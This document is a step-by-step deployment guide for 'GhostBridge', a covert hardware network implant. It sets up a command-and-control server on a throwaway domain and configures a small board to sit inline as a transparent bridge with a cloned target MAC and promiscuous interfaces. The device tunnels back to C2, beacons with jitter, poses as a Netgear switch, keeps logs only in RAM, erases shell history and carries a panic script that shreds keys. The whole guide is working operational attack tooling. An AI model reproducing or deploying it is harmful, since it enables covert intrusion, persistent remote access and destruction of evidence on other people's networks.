# 🚀 GhostBridge Deployment Guide

> **Version:** 0.1.0 | **Last Updated:** 2025-12-18

---

## 📋 Prerequisites

### Hardware Required
| Item | Specification | Purpose |
|------|---------------|---------|
| NanoPi R2S Plus | 1GB RAM, 32GB eMMC | Main device |
| MicroSD Card | 32GB+ Class 10 | OS installation |
| Ethernet Cable | Cat5e, 15-30cm | LAN connection |
| USB-C Cable | 1m, data+power | Power supply |
| USB Card Reader | MicroSD compatible | Flashing |

### Software Required
| Software | Version | Purpose |
|----------|---------|---------|
| Armbian | Latest | Base OS |
| Python | 3.11+ | GhostBridge |
| WireGuard | Latest | VPN tunnel |
| balenaEtcher | Latest | Image flashing |

### C2 Infrastructure
| Component | Requirement |
|-----------|-------------|
| VPS | 1 vCPU, 1GB RAM, Ubuntu 22.04 |
| Domain | Burn domain for C2 |
| MoMo Server | Running instance (optional) |

---

## 🛠️ Step-by-Step Deployment

### Step 1: Prepare C2 Server

```bash
# On your VPS (Ubuntu 22.04)

# 1. Update system
sudo apt update && sudo apt upgrade -y

# 2. Install WireGuard
sudo apt install wireguard -y

# 3. Generate server keys
wg genkey | tee /etc/wireguard/server_private.key | wg pubkey > /etc/wireguard/server_public.key
chmod 600 /etc/wireguard/server_private.key

# 4. Configure WireGuard server
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
Address = 10.66.66.1/24
ListenPort = 51820
PrivateKey = $(cat /etc/wireguard/server_private.key)
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# GhostBridge devices will be added here
# [Peer]
# PublicKey = <device_public_key>
# AllowedIPs = 10.66.66.2/32
EOF

# 5. Enable IP forwarding
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sysctl -p

# 6. Start WireGuard
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# 7. Verify
wg show
```

### Step 2: Flash Base Image

```bash
# On your workstation

# 1. Download Armbian for NanoPi R2S
wget https://redirect.armbian.com/nanopi-r2s/Bookworm_current

# 2. Flash to MicroSD
# Using balenaEtcher (GUI) or dd:
sudo dd if=Armbian_*.img of=/dev/sdX bs=4M status=progress
sync

# 3. Insert SD card into NanoPi R2S
# Connect via USB-C for power
# Wait for first boot (LED activity)
```

### Step 3: Initial Configuration

```bash
# Connect to NanoPi via serial or SSH
# Default: root / 1234

# 1. Change root password
passwd

# 2. Set hostname (use generic name)
hostnamectl set-hostname netswitch

# 3. Update system
apt update && apt upgrade -y

# 4. Install dependencies
apt install -y \
    python3 python3-pip python3-venv \
    wireguard wireguard-tools \
    bridge-utils iproute2 \
    net-tools htop tmux \
    git curl wget

# 5. Disable unnecessary services
systemctl disable --now \
    bluetooth \
    cups \
    avahi-daemon \
    ModemManager

# 6. Set timezone
timedatectl set-timezone UTC
```

### Step 4: Install GhostBridge

```bash
# 1. Create directory
mkdir -p /opt/ghostbridge
cd /opt/ghostbridge

# 2. Clone repository (or copy files)
git clone https://github.com/your-org/ghostbridge.git .
# Or: scp -r ghostbridge/* root@device:/opt/ghostbridge/

# 3. Create virtual environment
python3 -m venv venv
source venv/bin/activate

# 4. Install dependencies
pip install -r requirements.txt

# 5. Install as package
pip install -e .

# 6. Create config directory
mkdir -p /etc/ghostbridge
```

### Step 5: Generate Device Keys

```bash
# 1. Generate WireGuard keys for device
wg genkey | tee /etc/ghostbridge/wg_private.key | wg pubkey > /etc/ghostbridge/wg_public.key
chmod 600 /etc/ghostbridge/wg_private.key

# 2. Generate device identity
DEVICE_ID="ghost-$(date +%s | tail -c 5)"
echo $DEVICE_ID > /etc/ghostbridge/device_id

# 3. Display public key (add this to C2 server)
echo "Device ID: $DEVICE_ID"
echo "Public Key: $(cat /etc/ghostbridge/wg_public.key)"
```

### Step 6: Configure WireGuard (Device)

```bash
# Create WireGuard config
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat /etc/ghostbridge/wg_private.key)
Address = 10.66.66.2/24

[Peer]
PublicKey = <C2_SERVER_PUBLIC_KEY>
Endpoint = your-c2-server.com:51820
AllowedIPs = 10.66.66.0/24
PersistentKeepalive = 25
EOF

chmod 600 /etc/wireguard/wg0.conf

# Add device to C2 server
# On C2 server, add to /etc/wireguard/wg0.conf:
# [Peer]
# PublicKey = <device_public_key>
# AllowedIPs = 10.66.66.2/32
```

### Step 7: Configure GhostBridge

```bash
# Create main configuration
cat > /etc/ghostbridge/config.yml << EOF
# GhostBridge Configuration
# Device: $DEVICE_ID

device:
  id: "$DEVICE_ID"
  name: "Office Printer Drop"
  
network:
  bridge_name: br0
  wan_interface: eth0    # To wall port
  lan_interface: eth1    # To target device
  clone_mac: true        # Clone target MAC on WAN
  
tunnel:
  type: wireguard
  interface: wg0
  endpoint: "your-c2-server.com:51820"
  keepalive: 25
  reconnect_delays: [5, 10, 30, 60, 300]
  
beacon:
  enabled: true
  interval: 300          # 5 minutes
  jitter: 60             # ±1 minute
  
c2:
  api_endpoint: "http://10.66.66.1:8082/api/ghostbridge"
  
stealth:
  ramfs_logs: true
  fake_identity: "Netgear GS105"
  panic_on_tamper: true
  
logging:
  level: WARNING         # Minimal logging
  to_disk: false         # RAM only
EOF

chmod 600 /etc/ghostbridge/config.yml
```

### Step 8: Setup Bridge

```bash
# Create bridge setup script
cat > /etc/ghostbridge/setup-bridge.sh << 'EOF'
#!/bin/bash
# GhostBridge - Bridge Setup Script

BRIDGE=br0
WAN=eth0
LAN=eth1

# Wait for interfaces
while [ ! -e /sys/class/net/$LAN ]; do
    sleep 1
done

# Get target MAC (from LAN interface traffic)
# For now, we'll just use the LAN's connected device MAC
# This will be enhanced in the full implementation

# Create bridge
ip link add name $BRIDGE type bridge
ip link set $BRIDGE up

# Disable STP for faster convergence
echo 0 > /sys/class/net/$BRIDGE/bridge/stp_state

# Add interfaces to bridge
ip link set $WAN master $BRIDGE
ip link set $LAN master $BRIDGE

# Enable promiscuous mode
ip link set $WAN promisc on
ip link set $LAN promisc on

# Bring up interfaces
ip link set $WAN up
ip link set $LAN up

echo "Bridge $BRIDGE configured with $WAN and $LAN"
EOF

chmod +x /etc/ghostbridge/setup-bridge.sh
```

### Step 9: Create Systemd Services

```bash
# Main service
cat > /etc/systemd/system/ghostbridge.service << EOF
[Unit]
Description=GhostBridge Main Service
After=network-online.target
Wants=network-online.target
Before=ghostbridge-tunnel.service

[Service]
Type=oneshot
ExecStart=/etc/ghostbridge/setup-bridge.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

# Tunnel service
cat > /etc/systemd/system/ghostbridge-tunnel.service << EOF
[Unit]
Description=GhostBridge Tunnel Service
After=ghostbridge.service
Requires=ghostbridge.service

[Service]
Type=simple
ExecStart=/usr/bin/wg-quick up wg0
ExecStop=/usr/bin/wg-quick down wg0
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

# Beacon service
cat > /etc/systemd/system/ghostbridge-beacon.service << EOF
[Unit]
Description=GhostBridge Beacon Service
After=ghostbridge-tunnel.service
Requires=ghostbridge-tunnel.service

[Service]
Type=simple
ExecStart=/opt/ghostbridge/venv/bin/python -m ghostbridge.beacon
Restart=always
RestartSec=60
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
EOF

# Enable services
systemctl daemon-reload
systemctl enable ghostbridge ghostbridge-tunnel ghostbridge-beacon
```

### Step 10: Test Configuration

```bash
# 1. Test bridge
systemctl start ghostbridge
ip link show br0
brctl show br0

# 2. Test tunnel
systemctl start ghostbridge-tunnel
wg show
ping -c 3 10.66.66.1

# 3. Test beacon (if implemented)
systemctl start ghostbridge-beacon
journalctl -u ghostbridge-beacon -f

# 4. Reboot test
reboot
# Wait for device to come back
# Verify all services start
systemctl status ghostbridge ghostbridge-tunnel ghostbridge-beacon
```

### Step 11: Secure the Device

```bash
# 1. Disable root SSH password (use keys only)
mkdir -p ~/.ssh
# Add your public key to ~/.ssh/authorized_keys
sed -i 's/PermitRootLogin yes/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
systemctl restart sshd

# 2. Setup RAM disk for logs
echo "tmpfs /var/log tmpfs defaults,noatime,size=50M 0 0" >> /etc/fstab

# 3. Disable shell history
echo "unset HISTFILE" >> /root/.bashrc
rm -f /root/.bash_history

# 4. Configure watchdog
echo "RuntimeWatchdogSec=60" >> /etc/systemd/system.conf

# 5. Create panic script
cat > /usr/local/bin/panic << 'EOF'
#!/bin/bash
# GhostBridge Panic Script
systemctl stop ghostbridge-beacon ghostbridge-tunnel ghostbridge
shred -u /etc/ghostbridge/*.key
shred -u /etc/wireguard/*.conf
rm -rf /opt/ghostbridge
sync
reboot -f
EOF
chmod +x /usr/local/bin/panic
```

### Step 12: Final Preparation

```bash
# 1. Clean up logs
journalctl --vacuum-time=1s
rm -rf /var/log/*
rm -rf /tmp/*

# 2. Clear history
history -c
> /root/.bash_history

# 3. Set boot to quiet
# Edit /boot/armbianEnv.txt, add:
# extraargs=quiet loglevel=0

# 4. Final reboot
sync
reboot
```

---

## ✅ Deployment Verification

### Pre-Deployment Checklist

```
□ Device boots without monitor/keyboard
□ Bridge passes traffic
□ Tunnel connects to C2
□ Beacon reaches MoMo
□ Panic script tested
□ No unnecessary logs
□ All services auto-start
□ Device labeled (innocuous name)
```

### Connection Test

```bash
# On C2 server
# Verify device appears
wg show

# Check MoMo dashboard
# Device should appear in GhostBridge fleet

# Send test command
curl -X POST http://localhost:8082/api/ghostbridge/command \
  -H "Content-Type: application/json" \
  -d '{"device_id": "ghost-001", "action": "status"}'
```

---

## 🔧 Troubleshooting

### Device Won't Boot

| Symptom | Cause | Solution |
|---------|-------|----------|
| No LED | No power | Check USB-C cable |
| LED on, no network | SD card issue | Re-flash image |
| Kernel panic | Corrupt image | Re-flash image |

### Bridge Not Working

| Symptom | Cause | Solution |
|---------|-------|----------|
| No traffic | Bridge not up | `brctl show br0` |
| Target offline | Wrong cable | Check eth0/eth1 |
| Partial traffic | STP enabled | Disable STP |

### Tunnel Not Connecting

| Symptom | Cause | Solution |
|---------|-------|----------|
| No handshake | Firewall | Check port 51820 |
| Timeout | Wrong endpoint | Verify C2 IP/domain |
| Key error | Key mismatch | Regenerate keys |

### Beacon Not Working

| Symptom | Cause | Solution |
|---------|-------|----------|
| No beacons | Tunnel down | Check WireGuard |
| API error | Wrong endpoint | Check config |
| Auth error | Invalid device ID | Re-register device |

---

## 📦 Quick Deploy Script

```bash
#!/bin/bash
# GhostBridge Quick Deploy
# Usage: ./deploy.sh <C2_ENDPOINT> <C2_PUBKEY>

C2_ENDPOINT=$1
C2_PUBKEY=$2
DEVICE_ID="ghost-$(date +%s | tail -c 5)"

if [ -z "$C2_ENDPOINT" ] || [ -z "$C2_PUBKEY" ]; then
    echo "Usage: $0 <c2_endpoint> <c2_pubkey>"
    exit 1
fi

echo "Deploying GhostBridge..."
echo "Device ID: $DEVICE_ID"
echo "C2 Endpoint: $C2_ENDPOINT"

# Generate keys
wg genkey | tee /etc/ghostbridge/wg_private.key | wg pubkey > /etc/ghostbridge/wg_public.key
echo $DEVICE_ID > /etc/ghostbridge/device_id

# Configure WireGuard
cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat /etc/ghostbridge/wg_private.key)
Address = 10.66.66.2/24

[Peer]
PublicKey = $C2_PUBKEY
Endpoint = $C2_ENDPOINT
AllowedIPs = 10.66.66.0/24
PersistentKeepalive = 25
EOF

# Start services
systemctl enable --now ghostbridge ghostbridge-tunnel ghostbridge-beacon

# Display registration info
echo ""
echo "=== REGISTER ON C2 SERVER ==="
echo "Device ID: $DEVICE_ID"
echo "Public Key: $(cat /etc/ghostbridge/wg_public.key)"
echo ""
echo "Add this peer to C2 WireGuard config:"
echo "[Peer]"
echo "# $DEVICE_ID"
echo "PublicKey = $(cat /etc/ghostbridge/wg_public.key)"
echo "AllowedIPs = 10.66.66.2/32"
echo ""

echo "Deployment complete!"
```

---

*GhostBridge Deployment Guide v0.1.0*

